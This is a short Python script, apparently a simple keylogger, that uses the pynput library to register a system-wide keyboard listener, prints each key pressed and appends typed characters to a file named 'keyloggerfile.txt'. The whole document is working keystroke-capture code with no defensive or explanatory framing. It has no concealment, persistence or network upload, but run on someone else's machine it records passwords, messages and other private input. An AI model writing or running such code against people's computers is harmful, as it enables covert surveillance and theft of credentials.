from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open('keyloggerfile.txt', 'a') as f:
        try:
            f.write(str(key.char))
        except AttributeError:
            print('Error while getting the key pressed')

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()